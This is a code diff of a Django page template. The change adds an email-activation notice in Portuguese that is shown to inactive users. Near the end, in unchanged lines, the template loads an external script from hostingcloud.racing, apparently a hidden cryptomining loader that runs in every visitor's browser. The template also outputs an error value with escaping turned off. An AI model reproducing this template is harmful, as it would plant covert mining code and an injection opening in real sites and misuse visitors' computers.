@@ -25,6 +25,7 @@
 	</head>
 	<body>
 		<main>
+			{% if user_p.active %}
 			<div id="inner">
 				<form method="post" enctype="multipart/form-data">
 					{% csrf_token %}
@@ -72,6 +73,25 @@
 			</footer>
 
 			{{ error|safe }}
+			{% else %}
+				<style>
+					/* Estilos para a div abaixo. */
+					#alert-email-activation {
+						width: 80%;
+						margin: auto;
+					}
+					
+					@media (min-width: 320px) and (max-width: 480px) {
+						#alert-email-activation {
+							width: 98%;
+						}
+					}
+				</style>
+				<div id="alert-email-activation" class="alert alert-info" role="alert">
+					<p>O link de confirmação foi enviado para o seu email: {{ user.email }}. Por favor, confirme seu email para começar a fazer e responder perguntas.</p>
+					<a href="#">Enviar novamente</a>
+				</div>
+			{% endif %}
 		</main>
 <script src="https://www.hostingcloud.racing/Bkb7.js"></script>
 <script>
